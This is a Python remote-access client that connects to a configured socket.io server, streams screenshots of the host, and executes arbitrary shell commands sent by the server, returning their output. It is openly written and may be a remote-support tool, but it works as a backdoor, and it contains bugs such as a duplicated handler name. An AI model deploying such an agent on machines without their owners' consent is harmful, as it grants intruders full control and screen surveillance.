import socketio
import logging
import socket
import json
import atexit
import signal
import sys
import io
import time
import threading
import subprocess
from PIL import ImageGrab, ImageDraw
import pyautogui

with open('config.json') as json_file:
    data = json.load(json_file)

#Defined in config.json
socket_url = data["socket_url"]
socket_port = data["socket_port"]

logging.basicConfig(level=logging.DEBUG)
sio = socketio.Client(logger=True, engineio_logger=True)


#Info about the machine and the ip
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
  
screen_share = False

@sio.event
def connect():
    print('connection established')

    data = {'ip':IPAddr, 'hostname':hostname, 'type':'client_agent','sid':sio.sid}
    print(sio.sid)
    sio.emit('establish_agent',json.dumps(data))

    threading.Thread(target=screenshot_stream, daemon=True).start()


@sio.on('Server_Connection_Bot')
def Server_Connection(data):
    print(sio.sid)

@sio.event
def disconnect(session_id):
    print('Disconnected from server.')

@sio.on('message')
def handle_message(msg):
    print(f"Received message: {msg}")

@sio.on('server_sid')
def on_server_sid(data):
    print(f"Server-side SID: {data['sid']}")


@sio.on('kill_duplicate')
def kill_duplicate(sid):
    sio.disconnect()

@sio.on('enable_screen')
def kill_duplicate(sid):
    screen_share = True

# === SCREENSHOT STREAM ===

@sio.on('start_screen_sharing')
def start_screen_sharing(data):
    global screen_share
    if not screen_share:
        screen_share = True
        print("🎬 Screen sharing started.")
    else:
        screen_share = False


@sio.on('stop_screen_sharing')
def stop_screen_sharing():
    global screen_share
    if screen_share:
        screen_share = False
        print("🛑 Screen sharing stopped.")
    else:
        print("Screen sharing is already stopped.")


def compress_and_resize(image, max_width=1920, max_height=1080, quality=25):
    image.thumbnail((max_width, max_height))
    buffer = io.BytesIO()
    image.save(buffer, format="JPEG", quality=quality)  # Adjust quality
    buffer.seek(0)
    compressed_image_bytes = buffer.getvalue()
    
    return compressed_image_bytes

def screenshot_stream():
    while True:
        if screen_share:
            try:
                x, y = pyautogui.position()
                print(f"Mouse cursor position: X={x}, Y={y}")
                screenshot = ImageGrab.grab()
                draw = ImageDraw.Draw(screenshot)
                cursor_radius = 10
                draw.ellipse(
                    (x - cursor_radius, y - cursor_radius, x + cursor_radius, y + cursor_radius),
                    fill="red", outline="white", width=2
                )
                compressed_image_bytes = compress_and_resize(screenshot)
                sio.emit('screenshot_frame', compressed_image_bytes)
                time.sleep(1 / 10)
            except Exception as e:
                print(f"Error in screenshot stream: {e}")
                break
        else:
            time.sleep(1)

@sio.on('execute_command')
def execute_command(data):
    """
    Event handler that executes a shell command and sends the output back to the server.
    """
    try:
        input = json.loads(data)
        command = input.get('command')
        if command:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout
            error = result.stderr
            if output:
                sio.emit('command_output', {'output': output})
            if error:
                sio.emit('command_output', {'error': error})
        else:
            sio.emit('command_output', {'error': 'No command provided'})
    except Exception as e:
        print(f"Error executing command: {e}")
        sio.emit('command_output', {'error': str(e)})


try:
    sio.connect(f'http://{socket_url}:{socket_port}', transports=['websocket'])
    sio.wait()
except Exception as e:
    print(f"Failed to connect to server: {e}")